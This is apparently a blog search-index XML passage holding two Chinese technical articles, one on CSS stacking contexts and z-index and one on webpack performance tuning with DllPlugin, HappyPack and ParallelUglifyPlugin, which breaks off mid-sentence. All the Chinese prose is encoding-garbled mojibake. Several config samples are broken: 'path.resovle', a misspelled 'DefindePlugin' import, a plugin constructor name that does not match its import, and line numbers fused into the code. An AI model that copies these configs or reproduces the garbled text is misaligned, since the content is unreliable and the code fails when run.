ä¸ºä»€ä¹ˆè¦å®šä¹‰æ¦‚å¿µå‘¢ï¼Ÿå› ä¸ºä½¿ç”¨åŒä¸€æ¦‚å¿µæ˜“äºçŸ¥è¯†çš„äº¤æµä¸ä¼ æ’­ã€‚ ä½†æœ‰ä¸€ä¸ªç¼ºé™·ï¼šå½“ä¸ç†è§£è¿™ä¸ªæ¦‚å¿µçš„æ—¶å€™ï¼Œè§£æèµ·æ¥çš„å¤æ‚çš„ï¼Œè§£æçš„ä¸å¥½æ—¶å€™ï¼Œä»–äººç†è§£èµ·æ¥æ›´æ˜¯å›°éš¾ï¼Œç”šè‡³è¯¯è§£ã€‚å¾—çœ‹è§£æçš„äººçš„æ°´å‡†ï¼Œæ‰€ä»¥è‹¥ä¸‹æ–‡æœ‰ç¼ºé™·è¿˜æ˜¯å¾ˆå¸Œæœ›æœ‰å¤§ä½¬æ¥æ–§æ­£çš„ï¼ å±‚å ä¸Šä¸‹æ–‡ html æ–‡æ¡£æœ‰ä¸€ä¸ªä¸‰ç»´çš„æ¦‚å¿µï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºçš„ z è½´ã€‚å‡è®¾æ•´ä¸ª html æ–‡æ¡£æ²¡æœ‰æ–°å»ºçš„å±‚å ä¸Šä¸‹æ–‡ï¼Œé‚£ä¹ˆå°±åªæœ‰ä¸€ä¸ªæ ¹å±‚å ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥æƒ³è±¡æˆä¸Šå›¾ x è½´å’Œ y è½´äº¤å‰å½¢æˆçš„ç´«è‰²å¹³é¢ã€‚å¦‚æœæœ‰æ–°åˆ›å»ºå±‚å ä¸Šä¸‹æ–‡ï¼Œé‚£ä¹ˆä¼šæ ¹æ®å±‚å ä¸Šä¸‹æ–‡çš„é¡ºåºï¼Œå½¢æˆå±‚å ç©ºé—´ï¼Œå¦‚ä¸Šå›¾ Stack element1 å’Œ Stack element2ã€‚ é‚£ä¹ˆå±‚å ä¸Šä¸‹æ–‡ä¹‹é—´åˆæœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿä¸Šæ–‡æåŠçš„å±‚å ä¸Šä¸‹æ–‡çš„é¡ºåºåˆæ˜¯æ€ä¹ˆæ ·çš„ä¸€ä¸ªé¡ºåºå‘¢ï¼Ÿ å±‚å ä¸Šä¸‹æ–‡ä¹‹é—´çš„å…³ç³» å±‚å ä¸Šä¸‹æ–‡æ¯”æ ¹å±‚å ä¸Šä¸‹æ–‡ï¼ˆæ™®é€šå…ƒç´ ï¼‰ä¼˜å…ˆçº§é«˜ã€‚ å±‚å ä¸Šä¸‹æ–‡å¯ä»¥åµŒå¥—ï¼Œåœ¨å±‚å ä¸Šä¸‹æ–‡ä¸­å¯ä»¥æ–°å»ºå±‚å ä¸Šä¸‹æ–‡ã€‚ å±‚å ä¸Šä¸‹æ–‡å…„å¼Ÿä¹‹é—´å½¼æ­¤ç‹¬ç«‹ï¼Œå½“æ¶‰åŠå…„å¼Ÿå±‚å ä¸Šä¸‹æ–‡æ¯”è¾ƒæ—¶ï¼Œæ¯”è¾ƒçˆ¶å…ƒç´ ä¹‹é—´çš„ä¼˜å…ˆçº§ï¼Œå­å…ƒç´ ç»§æ‰¿çˆ¶å…ƒç´ çš„ä¼˜å…ˆçº§ï¼›è‹¥çˆ¶å…ƒç´ ä¼˜å…ˆçº§ç›¸åŒï¼Œåˆ™éµå¾ªåæ¥æ®ä¸Šçš„åŸåˆ™ã€‚ å±‚å ä¸Šä¸‹æ–‡è‡ªæˆä½“ç³»ï¼Œå¯ä»¥ç†è§£æˆå±‚å ä¸Šä¸‹æ–‡ä¸­çš„å…ƒç´ çš„å±‚å å…³ç³»åªéµå¾ªå±‚å ä¸Šä¸‹æ–‡çš„é¡ºåºè§„åˆ™ï¼Œä¸å—å…¶ä»–å±‚å ä¸Šä¸‹æ–‡æå…¶å…¶ä»–å› ç´ çš„å½±å“ã€‚ è¿™é‡Œå›¾è§£ä¸€ä¸‹ç¬¬ä¸‰ç‚¹ å±‚å ä¸Šä¸‹æ–‡çš„å±‚å é¡ºåº å›¾ç‰‡å³ä¸Šè§’ Stacking Order å³æ˜¯å±‚å é¡ºåºçš„æ„æ€ï¼Œæ€»å…± 7 å±‚ï¼Œï¼ˆå‘ƒï¼Œå°å­¦ç”Ÿä¹Ÿæ•°çš„å‡ºæ¥ï¼‰è‡³äºå„ä¸ªå±‚çº§ä¹‹é—´é‚£å‡ ä¸ªè‹±æ–‡å•è¯åº”è¯¥ä¸æˆé—®é¢˜å§ï½åº”è¯¥ï½åº”â€¦ é™¤äº†ç¬¬ 1 å±‚ (background/Borders) å’Œç¬¬ 5 å±‚ (Inline Boxes)ï¼Œå…¶ä»–å±‚çº§ç›¸ä¿¡ä¹ŸæŒºå¥½ç†è§£çš„ï¼Œæˆ‘ä»¬é‡ç‚¹åˆ†æç¬¬ 1ã€5å±‚ï¼š Background/Bordersï¼šèƒŒæ™¯è¾¹æ¡†åœ¨æœ€åº•å±‚ï¼Œæ„æŒ‡ä½å¤„å±‚å ä¸Šä¸‹æ–‡æœ€åº•å±‚çš„å…ƒç´ çš„èƒŒæ™¯å’Œè¾¹ï¼Œä¸ç®¡ä½ è®¾ç½®å­å…ƒç´ çš„ z-index çš„å€¼ä¸ºè´Ÿå¤šå°‘ï¼Œå§‹ç»ˆåœ¨è¿™ä¸ªå±‚å ä¸Šä¸‹æ–‡ä¸­ã€‚ Inline Boxesï¼šè¡Œå†…å…ƒç´ ä»–å…„å¼Ÿ Inline-block å…¶å®å§ä¹Ÿæ˜¯å±äºè¿™ä¸€å±‚çš„ã€‚ å½“å…ƒç´ å¤„äºç›¸åŒçš„å±‚çº§æ—¶ï¼Œæ¯”å¦‚ z-index éƒ½æ˜¯ 1 ï¼Œé‚£ä¹ˆéµå¾ªåæ¥å±…ä¸Šçš„åŸåˆ™ã€‚ å±‚å ä¸Šä¸‹æ–‡çš„åˆ›å»º å±‚å ä¸Šä¸‹æ–‡çš„åˆ›å»ºåˆ†ä¸ºä¸‰ç§ç±»å‹ï¼ŒåŸæœ¬å°±å­˜åœ¨çš„æ ¹å±‚å ä¸Šä¸‹æ–‡ã€å®šä½å…ƒç´ åˆ›å»ºçš„å±‚å ä¸Šä¸‹æ–‡ã€css3æ–°å±æ€§åˆ›å»ºçš„å±‚å ä¸Šä¸‹æ–‡ã€‚ä¸‹é¢æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ï¼š æ ¹å±‚å ä¸Šä¸‹æ–‡ä¹Ÿå°±æ˜¯åŸå§‹ html çš„æ–‡æ¡£ï¼Œä¹Ÿç§°ä¸ºæ™®é€šå…ƒç´ ã€‚å±‚å ä¸Šä¸‹æ–‡çš„åˆ›å»ºæ€»å¾—æœ‰ä¸ªå‚ç…§ç‰©å§ï¼Ÿå°±åƒç»å¯¹å®šä½ç±»ä¼¼ï¼Œæ²¡æœ‰ç»™å®ƒåšå‚ç…§çš„ï¼Œå°±ä»¥æµè§ˆå™¨çª—å£ä½œä¸ºå‚ç…§å®šä½ä¸€ä¸ªé“ç†ã€‚ å®šä½å…ƒç´ ä¸å±‚å ä¸Šä¸‹æ–‡ å½“ position çš„å€¼ä¸º relative/absolute æ—¶ï¼Œåªè¦ z-index ä¸æ˜¯é»˜è®¤å€¼ auto åˆ›å»ºä¸Šä¸‹æ–‡ã€‚ å½“ postion çš„å€¼ä¸º fixed æ—¶ï¼Œé»˜è®¤åˆ›å»ºä¸Šä¸‹æ–‡ã€‚ æ³¨æ„ï¼šè¿™é‡Œæµè§ˆå™¨å®ç°å®ç°æœ‰å·®å¼‚ï¼Œè¿™é‡Œåªè€ƒè™‘ chromeï¼Œå…¶ä»–æµè§ˆå™¨è¯·è‡ªè¡Œåšæµ‹è¯•ã€‚ è¯·çœ‹ä¸‹é¢çš„ğŸŒ°ï¼š å¯ä»¥çœ‹åˆ°åŠ¨æ¼«å›¾ç‰‡è·‘åˆ° box åé¢å»äº†ï¼Œå¦‚æœæˆ‘ä»¬æŠŠ box çš„ z-index æ”¹ä¸º 0: åŠ¨æ¼«å›¾ç‰‡å°±è·‘ä¸Šæ¥äº†ã€‚åœ¨æ¥è¯•è¯• position: fixed: å¯ä»¥çœ‹åˆ°å³ä½¿ z-index ä¸º auto ä¸€æ ·å¯ä»¥å½¢æˆå±‚å ä¸Šä¸‹æ–‡ï¼Œä½¿ z-index ä¸ºè´Ÿå€¼çš„ img ä¸ä¼šè·‘åˆ° box åé¢å»ã€‚ css3æ–°å±æ€§ä¸å±‚å å¼ä¸Šä¸‹æ–‡css3 å‡ºç°çš„ä¸€äº›æ–°å±æ€§å¯¹è¿‡å»å¾ˆå¤šè§„åˆ™å‘ç”Ÿäº†æŒ‘æˆ˜ã€‚è€Œå¯¹å±‚å ä¸Šä¸‹æ–‡åˆå½±å“çš„åŒ…æ‹¬ä»¥ä¸‹å±æ€§ï¼š z-index å€¼ä¸ä¸º auto çš„ flex é¡¹ï¼ˆçˆ¶å…ƒç´ ä¸º display: flex | inline-flex); å…ƒç´ çš„ opacity å€¼ä¸æ˜¯ 1ï¼› å…ƒç´ çš„ transform å€¼ä¸æ˜¯ none; å…ƒç´ çš„ mix-blend-mode å€¼ä¸æ˜¯ normal; å…ƒç´ çš„ filter å€¼ä¸æ˜¯ none; å…ƒç´ çš„ isolation æ˜¯ isolate; will-change æŒ‡å®šçš„å±æ€§å€¼ä¸ºä¸Šé¢ä»»æ„ä¸€ä¸ªï¼› å…ƒç´  -webkit-overflow-scrolling è®¾ä¸º touchã€‚ display: flex|inline-flex ä¸å±‚å ä¸Šä¸‹æ–‡ å¯ä»¥çœ‹åˆ° z-index: 0 ä¸èµ·ä½œç”¨ï¼Œå›¾ç‰‡è·‘ä¸‹é¢å»äº† æ²¡æœ‰å®šä½å…ƒç´ ï¼Œbox çš„ z-index:0 èµ·ä½œç”¨ï¼Œå›¾ç‰‡ä¸èƒ½è·‘åˆ° box ä¸‹é¢ã€‚ opacity ä¸å±‚å ä¸Šä¸‹æ–‡ å¯ä»¥çœ‹åˆ° opacity ä½¿ z-index èµ·ä½œç”¨ï¼Œå½¢æˆäº†å±‚å ä¸Šä¸‹æ–‡ï¼Œå›¾ç‰‡ä¸èƒ½è·‘åˆ° box ä¸‹é¢ã€‚ å‰©ä¸‹çš„å‡ ä¸ªå±æ€§ï¼Œä½œä¸ºç»ƒæ‰‹ï¼Œè¯·è¯»è€…äº²è‡ªè¯•è¯•ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ï½]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>z-index</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpackä¹‹ä¼˜åŒ–]]></title>
    <url>%2Fwebpack%E4%B9%8B%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[åœ¨ä¸Šç¯‡ webpack ä¹‹åŸºç¡€é…ç½®è®²è§£äº† webpack çš„ä¸€äº›åŸºæœ¬ç”¨æ³•ï¼Œæœ¬ç¯‡æˆ‘ä»¬æ¥è¯¦ç»†åˆ†æä¸‹ webpack æ€§èƒ½ç›¸å…³ä¼˜åŒ–ã€‚ webpack çš„ä¼˜åŒ–å¯åˆ†ä¸ºä¸¤å¤§ç±»ï¼š ä¼˜åŒ–å¼€å‘ä½“éªŒï¼šæé«˜æ„å»ºé€Ÿåº¦ã€çƒ­æ›¿æ¢å’Œè‡ªåŠ¨åˆ·æ–°ã€‚ ä¼˜åŒ–è¾“å‡ºè´¨é‡ï¼šå‹ç¼©ã€CDN åŠ é€Ÿã€ä½¿ç”¨ Tree Shakingã€æå–å…¬å…±ä»£ç ã€æŒ‰éœ€åŠ è½½ç­‰ã€‚ ä¼˜åŒ–å¼€å‘ä½“éªŒ ç¼©å°æ–‡ä»¶æœç´¢èŒƒå›´webpack å¯åŠ¨åä¼šä» entry å‡ºå‘é€’å½’è§£æå’Œå¤„ç† moduleã€‚å¤„ç† module çš„æ—¶å€™æ¶‰åŠæŸ¥æ‰¾ module å¯¹åº”çš„æ–‡ä»¶å’Œ module è§£æä¸¤ä¸ªæ­¥éª¤ã€‚å½“é¡¹ç›®æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæŸ¥æ‰¾å’Œè§£æ module å¯èƒ½ä¼šé€ æˆæ„å»ºç¼“æ…¢ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥ä»è¿™ä¸ªç‚¹å‡ºå‘ï¼Œè¿›è¡Œä¼˜åŒ–ã€‚ ä¼˜åŒ– Loader é…ç½®ç”±äº loader è½¬æ¢è€—æ—¶ï¼Œå› æ­¤åº”å°½å¯èƒ½å‡å°‘ä¸å¿…è¦çš„ loader è½¬æ¢ï¼Œå¯ä»¥é€šè¿‡ testã€includeã€exclude ç­‰ç¼©å°å‘½ä¸­èŒƒå›´ï¼š 123456789101112const config = &#123; module: &#123; rules: [ &#123; test: /\.js$/, use: ['babel-loader?cacheDirectory'], // åªå¤„ç† src ç›®å½•ä¸‹çš„æ–‡ä»¶ include: path.resovle(__dirname, 'src') &#125; ] &#125;&#125; ä¼˜åŒ– resolve.modules é…ç½®é»˜è®¤ç¬¬ä¸‰æ–¹æ¨¡å—åœ¨å½“å‰ç›®å½•ä¸‹çš„ node_modules ç›®å½•ä¸‹æŸ¥æ‰¾ï¼Œæ‰¾ä¸åˆ°å† å¾€ä¸Š ../node_modulesï¼Œå†ä¸åˆ°å†å¾€ä¸Š ../../node_modulesã€‚ å½“æˆ‘ä»¬æ‰€éœ€è¦çš„ç¬¬ä¸‰æ–¹æ¨¡å—éƒ½åœ¨å½“å‰ç›®å½•ä¸‹çš„ node_modules æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç»å¯¹è·¯å¾„ã€‚å‡å°‘æœç´¢æ—¶é—´ï¼š 12345const config = &#123; resolve: &#123; modules: [path.resolve(__dirname, 'node_modules')] &#125;&#125; ä¼˜åŒ– module.noParse é…ç½®æ²¡æœ‰é‡‡ç”¨æ¨¡å—åŒ–çš„æ–‡ä»¶ï¼Œæ²¡å¿…è¦ç»è¿‡ webpack çš„å¤„ç†ï¼Œä¾‹å¦‚: jQueryã€ChartJSã€‚ 12345const config = &#123; module: &#123; noParse: [/chartjs/], &#125;&#125; ä½¿ç”¨ DllPluginä½¿ç”¨è¿‡ window ç³»ç»Ÿçš„äººï¼Œåº”è¯¥ç»å¸¸çœ‹åˆ° .dll åç¼€çš„æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶æˆä¸ºåŠ¨æ€é“¾æ¥åº“ï¼Œåœ¨ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ä¸­å¯ä»¥åŒ…å«ç»™å…¶ä»–æ¨¡å—è°ƒç”¨çš„å‡½æ•°å’Œæ•°æ®ã€‚ webpack å¯ä»¥åˆ©ç”¨ DllPlugin å°†å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“æ‰“åŒ…è¿›åŠ¨æ€é“¾æ¥åº“ä¸­ï¼Œä¾‹å¦‚ï¼šreactã€react-domï¼Œåªè¦ä¸å‡çº§è¿™äº›æ¨¡å—ï¼ŒåŠ¨æ€é“¾æ¥åº“å°±ä¸ç”¨é‡æ–°ç¼–è¯‘ï¼Œä»è€Œå¤§é‡ç¼©çŸ­ç¼–è¯‘æ—¶é—´ã€‚ æ¥å…¥ wepackwebpack å·²ç»å†…ç½®äº†å¯¹åŠ¨æ€é“¾æ¥åº“çš„æ”¯æŒï¼Œéœ€è¦é€šè¿‡ä¸¤ä¸ªå†…ç½®çš„æ’ä»¶æ¥å…¥ï¼š DllPluginï¼š ç”¨äºæ‰“åŒ…åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚ DllReferencePlugin: ç”¨äºåœ¨ä¸»é…ç½®æ–‡ä»¶ä¸­å¼•å…¥ DllPlugin æ‰“åŒ…å¥½çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚ ä¸ºäº†æ–¹ä¾¿è¯´æ˜ï¼Œæˆ‘ç”¨ webpack ç®€å•æ„å»ºäº† react å’Œ react-dom åˆæˆçš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œè¾“å‡ºç›®å½•å¦‚ä¸‹ï¼š 123/dist |-- react.dll.js |-- react.manifest.json react.dll.js çš„å†…å®¹å¤§è‡´å¦‚ä¸‹ï¼š 1234567891011var _dll_react = (function(modules) &#123; // ... æ­¤å¤„çœç•¥ webpackBoostrap å‡½æ•°ä»£ç &#125;([ function(module, exports, __webpack_require__) &#123; // æ¨¡å— ID ä¸º 0 çš„æ¨¡å—å¯¹åº”çš„ä»£ç  &#125;ï¼Œ function(module, exports, __webpack_require__) &#123; // æ¨¡å— ID ä¸º 1 çš„æ¨¡å—å¯¹åº”çš„ä»£ç  &#125;ï¼Œ // ... çœç•¥å…¶ä»–æ¨¡å—å¯¹åº”çš„ä»£ç ])); å¯ä»¥ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä¸­å¯ä»¥åŒ…å«å¤§é‡æ¨¡å—ï¼Œæ¨¡å—ä»¥æ•°ç»„ç´¢å¼•æœ€ä¸º IDï¼Œå¹¶ä¸”é€šè¿‡ _dll_react å˜é‡å°†è‡ªå·±æš´éœ²åœ¨å…¨å±€ä¸­ã€‚ react.manifest.json ä¹Ÿæ˜¯ç”± DllPlugin ç”Ÿæˆçš„ï¼Œç”¨äºæè¿°åŠ¨æ€é“¾æ¥åº“ä¸­åŒ…å«å“ªäº›æ¨¡å—ï¼š 12345678910111213141516171819202122232425262728&#123; // æè¿°è¯¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æš´éœ²åœ¨å…¨å±€çš„å˜é‡åç§° "name": "_dll_react", "content": &#123; "./node_modules/process/browser.js": &#123; "id": 0, "meta": &#123;&#125; &#125;, // ... æ­¤å¤„çœç•¥éƒ¨åˆ†æ¨¡å— "./node_modules/react-dom/lib/ReactBrowserEventEmitter.js": &#123; "id": 42, "meta": &#123;&#125; &#125;, "./node_modules/react/lib/lowPriorityWarning.js": &#123; "id": 47, "meta": &#123;&#125; &#125;, // ... æ­¤å¤„çœç•¥éƒ¨åˆ†æ¨¡å— "./node_modules/react-dom/lib/SyntheticTouchEvent.js": &#123; "id": 210, "meta": &#123;&#125; &#125;, "./node_modules/react-dom/lib/SyntheticTransitionEvent.js": &#123; "id": 211, "meta": &#123;&#125; &#125;, &#125;&#125; å¯è§ manifest.json æ–‡ä»¶æ¸…æ¥šçš„æè¿°å¯¹åº”çš„ dll æ–‡ä»¶åŒ…å«å“ªäº›æ¨¡å—ï¼Œä»¥åŠè¿™äº›æ¨¡å—çš„ IDã€‚å¯¹åº”çš„ html ä¸ºï¼š 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;title&gt;Page Title&lt;/title&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt;&lt;/div&gt; &lt;!--å¯¼å…¥ä¾èµ–çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶--&gt; &lt;script src="./dist/react.dll.js"&gt;&lt;/script&gt; &lt;!--å¯¼å…¥æ‰§è¡Œå…¥å£æ–‡ä»¶--&gt; &lt;script src="./dist/bundle.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; æ„å»ºåŠ¨æ€é“¾æ¥åº“æ–°å»ºä¸€ä¸ª webpack_dll.config.js æ–‡ä»¶æ„å»ºåŠ¨æ€é“¾æ¥åº“ï¼š 123456789101112131415161718192021222324const path = require('path');const DllPlugin = require('webpack/lib/DllPlugin');module.exports = &#123; entry: &#123; react: ['react', 'react-dom'] &#125;, output: &#123; filename: '[name].dll.js', path: path.resolve(__dirname, 'dist'), // å­˜æ”¾åŠ¨æ€é“¾æ¥åº“å…¨å±€å˜é‡çš„åç§°ï¼Œå¯¹ react æ¥è¯´æ˜¯ _dll_react // åŠ ä¸Š _dll_ æ˜¯ä¸ºäº†é˜²æ­¢å‘½åå†²çª library: '_dll_[name]', &#125;, plugins: [ new DllPlugin(&#123; // åŠ¨æ€é“¾æ¥åº“çš„åç§°ï¼Œéœ€è¦å’Œ library ä¿æŒä¸€è‡´ // è¯¥å­—æ®µçš„å€¼ä¹Ÿå°±æ˜¯è¾“å‡ºçš„ manifest.json æ–‡ä»¶ä¸­ name çš„å€¼ name: '_dll_[name]', // æè¿°åŠ¨æ€é“¾æ¥åº“çš„ manifest.json æ–‡ä»¶è¾“å‡ºæ—¶çš„æ–‡ä»¶å path: path.resolve(__dirname, 'dist', '[name].manifest.json') &#125;) ]&#125; ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“12345678910111213141516171819202122232425262728293031323334const path = require('path');const ExtractTextPlugin = require('extract-text-webpack-plugin');const DllReferencePlugin = require('webpack/lib/DllReferencePlugin')module.exports = &#123; entry: './main.js', output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, './dist'), &#125;, module: &#123; rules: [ &#123; test: /\.css$/, use: ExtractTextPlugin.extract(&#123; use: ['css-loader'], &#125;) &#125;, &#123; test: /\.js/, use: ['babel-loader'], exclude: path.resolve(__dirname, 'node_modules') &#125;] &#125;, plugins: [ // å‘Šè¯‰ webpack ä½¿ç”¨äº†å“ªäº›åŠ¨æ€é“¾æ¥åº“ new DllReferencePlugin(&#123; // æè¿° react åŠ¨æ€é“¾æ¥åº“çš„æ–‡ä»¶å†…å®¹ manifest: require('./dist/react.manifest.json'), &#125;), new ExtractTextPlugin(&#123; filename: '[name]_[contenthash:8].css', &#125;), ]&#125; ä½¿ç”¨ HappyPackwebpack ä»¥å•çº¿ç¨‹æ¨¡å¼è¿è¡Œåœ¨ nodejs ä¹‹ä¸Šï¼Œå½“é¡¹ç›®å¤§ï¼Œéœ€è¦å¤„ç†å¤§é‡æ–‡ä»¶çš„æ—¶å€™ï¼Œä¸èƒ½å……åˆ†åˆ©ç”¨ CPU çš„æ€§èƒ½ã€‚ HappyPack å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå®ƒæŠŠä»»åŠ¡åˆ†ç»™å¤šä¸ªå­è¿›ç¨‹å»å¹¶å‘æ‰§è¡Œï¼Œå­è¿›ç¨‹å¤„ç†å®Œåå†æŠŠç»“æœè¿”å›ç»™ä¸»è¿›ç¨‹ã€‚ æ¥å…¥ HappyPackåˆ†è§£ä»»åŠ¡å’Œè¿›ç¨‹ç®¡ç† HappyPack éƒ½ä¼šè‡ªåŠ¨å®Œæˆï¼Œä½ æ‰€éœ€è¦åšçš„åªæ˜¯æ¥å…¥ HappyPackï¼š 12345678910111213141516171819202122232425262728293031323334353637const path = require('path');const ExtractTextPlugin = require('extract-text-webpack-plugin');const HappyPack = require('happypack');const config = &#123; module: &#123; rules: [ &#123; test: /\.js$/, // å°† js æ–‡ä»¶äº¤ç»™ id ä¸º babel çš„ HappyPack è¿›ç¨‹å¤„ç† use: ['happypack/loader?id=babel'], exclude: path.resolve(__dirname, 'node_modules') &#125;, &#123; test: /\.css$/, use: ExtractTextPlugin.extract(&#123; // å°† css æ–‡ä»¶äº¤ä¸ª id ä¸º css çš„ HappyPack è¿›ç¨‹å¤„ç† use: ['happypack/loader?id=css'] &#125;) &#125; ] &#125;, plugins: [ new HappyPack(&#123; // æ ‡è¯† HappyPack è¿›ç¨‹ id: 'babel', // å¦‚ä½•å¤„ç† .js æ–‡ä»¶ï¼Œç”¨æ³•å’Œ loader é…ç½®ä¸€æ · loaders: ['babel-loader?cacheDirectory'] &#125;), new HappyPack(&#123; id: 'css', loaders: ['css-loader'] &#125;), new ExtractTextPlugin(&#123; filename: '[name].css' &#125;) ]&#125; é™¤äº†æ”¯æŒ id å’Œ loadersï¼ŒHappyPack è¿˜æ”¯æŒå¦‚ä¸‹å‚æ•°ï¼š threads: ä»£è¡¨å¼€å‡ ä¸ªè¿›ç¨‹å»å¤„ç†è¿™ä¸€ç±»æ–‡ä»¶ï¼Œé»˜è®¤æ˜¯ 3 ä¸ªï¼Œç±»å‹å¿…é¡»æ˜¯æ•´æ•°ã€‚ verbose: æ˜¯å¦å…è®¸ HappyPack è¾“å‡ºæ—¥å¿—ï¼Œé»˜è®¤ trueã€‚ threadPool: ä»£è¡¨å…±äº«è¿›ç¨‹æ± ï¼Œå³å¤šä¸ª HappyPack å®ä¾‹éƒ½ä½¿ç”¨åŒä¸€ä¸ªå…±äº«è¿›ç¨‹æ± ä¸­çš„å­è¿›ç¨‹å¤„ç†ä»»åŠ¡ï¼Œä»¥é˜²æ­¢èµ„æºå ç”¨è¿‡å¤šã€‚ è¿›ç¨‹æ± çš„åˆ›å»ºï¼š 1const happyThreadPool = HappyPack.ThreadPool(&#123;size: 5&#125;) ä½¿ç”¨ ParallelUglifyPluginåœ¨æ„å»ºçº¿ä¸Šä»£ç çš„æ—¶å€™ï¼Œéœ€è¦å¯¹ä»£ç è¿›è¡Œå‹ç¼©ï¼Œä¼šå‘ç°è¿™ä¸ªè¿‡ç¨‹ç›¸æ¯”å¼€å‘ç¯å¢ƒæ…¢å¾ˆå¤šã€‚å› ä¸ºå‹ç¼© js ä»£ç éœ€è¦å…ˆæŠŠä»£ç è§£ææˆç”¨ Object æŠ½è±¡è¡¨ç¤ºçš„ AST è¯­æ³•æ ‘ï¼Œå†å»åº”ç”¨å„ç§è§„åˆ™åˆ†æå’Œå¤„ç† ASTï¼Œå¯¼è‡´è¿™ä¸ªè¿‡ç¨‹è®¡ç®—é‡å·¨å¤§ï¼Œè€—æ—¶éå¸¸å¤šã€‚ ä½¿ç”¨ parallelUglifyPlugin å¯ä»¥å¼€å¯å¤šä¸ªè¿›ç¨‹è¿›è¡Œå¹¶è¡Œå‹ç¼©ï¼ŒåŠ å¿«æ„å»ºè¿‡ç¨‹ï¼š 123456789101112131415161718192021222324252627282930const path = require('path');const DefinePlugin = require('webpack/lib/DefindePlugin');const ParallelUglifyPlugin = require('webpack-parallel-uglify-plugin');module.exports = &#123; plugins: [ // ä½¿ç”¨ ParallelUglifyPlugin å¹¶è¡Œå‹ç¼© js ä»£ç  new ParalleUglifyPlugin(&#123; // ä¼ é€’ç»™ UglifyJS çš„å‚æ•° uglifyJS: &#123; output: &#123; // æœ€ç´§å‡‘è¾“å‡º beautify: false, // åˆ é™¤æ‰€æœ‰æ³¨é‡Š comments: false, &#125;, compress: &#123; // åœ¨ UglifyJS åˆ é™¤æ²¡æœ‰ç”¨åˆ°çš„ä»£ç æ—¶ä¸è¾“å‡ºè­¦å‘Š warnings: false, // åˆ é™¤æ‰€æœ‰çš„ console è¯­å¥ï¼Œå…¼å®¹ ie drop_console: true, // å†…åµŒå®šä¹‰äº†ä½†åªç”¨åˆ°ä¸€æ¬¡çš„å˜é‡ collapse_vars: true, // æå–å‡ºå‡ºç°å¤šæ¬¡ä½†æ˜¯æ²¡æœ‰å®šä¹‰æˆå˜é‡å»å¼•ç”¨çš„é™æ€å€¼ reduce_vars: true, &#125; &#125; &#125;) ]&#125; ParallelUglifyPlugin æ”¯æŒä»¥ä¸‹å‚æ•°ï¼š testï¼šä½¿ç”¨æ­£åˆ™å»åŒ¹é…éœ€è¦å‹ç¼©å“ªäº›æ–‡ä»¶ï¼Œé»˜è®¤æ˜¯ /\.js$/ã€‚ include: ä½¿ç”¨æ­£åˆ™å»å‘½ä¸­éœ€è¦è¢«å‹ç¼©çš„æ–‡ä»¶ï¼Œé»˜è®¤ []ã€‚ exclude: ä½¿ç”¨æ­£åˆ™å»å‘½ä¸­ä¸éœ€è¦è¢«å‹ç¼©çš„æ–‡ä»¶ï¼Œé»˜è®¤ []ã€‚ cacheDir: ç¼“å­˜å‹ç¼©åçš„ç»“æœï¼Œé»˜è®¤ä¸ç¼“å­˜ï¼Œè‹¥éœ€è¦ç¼“å­˜è¯·è®¾ç½®ä¸€ä¸ªç›®å½•è·¯å¾„ã€‚ workerCount: å¼€å¯å‡ ä¸ªè¿›ç¨‹å»æ‰§è¡Œå‹ç¼©ï¼Œé»˜è®¤å½“å‰ CPU æ ¸æ•°å‡ä¸€ã€‚ sourceMap: æ˜¯å¦è¾“å‡º Source Mapï¼Œè¿™ä¼šå¯¼è‡´å‹ç¼©è¿‡ç¨‹å˜æ…¢ã€‚ uglifyJSï¼šç”¨äºå‹ç¼© es5 ä»£ç æ—¶çš„é…ç½®ï¼ŒObject ç±»å‹ï¼Œç›´æ¥ä¼ é€’ç»™ UglifyJS çš„å‚æ•°ã€‚ uglifyESï¼šç”¨äºå‹ç¼© es6 ä»£ç æ—¶çš„é…ç½®ï¼ŒObject ç±»å‹ï¼Œç›´æ¥ä¼ é€’ç»™ UglifyES çš„å‚æ•°ã€‚ å…¶ä¸­ testã€includeã€exclude ä¸é…ç½® loader æ—¶çš„æ€æƒ³å’Œç”¨æ³•ä¸€æ ·ã€‚ UglifyES æ˜¯ UglifyJS çš„å˜ç§ï¼Œä¸“é—¨ç”¨äºå‹ç¼© es6 ä»£ç ï¼Œå®ƒä»¬ä¸¤éƒ½å‡ºè‡ªäºåŒä¸€é¡¹ç›®ï¼Œä½†ä¸èƒ½åŒæ—¶ä½¿ç”¨ã€‚ UglifyES ä¸€èˆ¬ç”¨äºç»™æ¯”è¾ƒæ–°çš„ js è¿è¡Œç¯å¢ƒå‹ç¼©ä»£ç ï¼Œä¾‹å¦‚ react-nativeï¼Œä¸ºäº†èƒ½å¾—åˆ°æ›´å¥½çš„æ€§èƒ½å’Œå°ºå¯¸ï¼Œé‡‡ç”¨ UglifyES 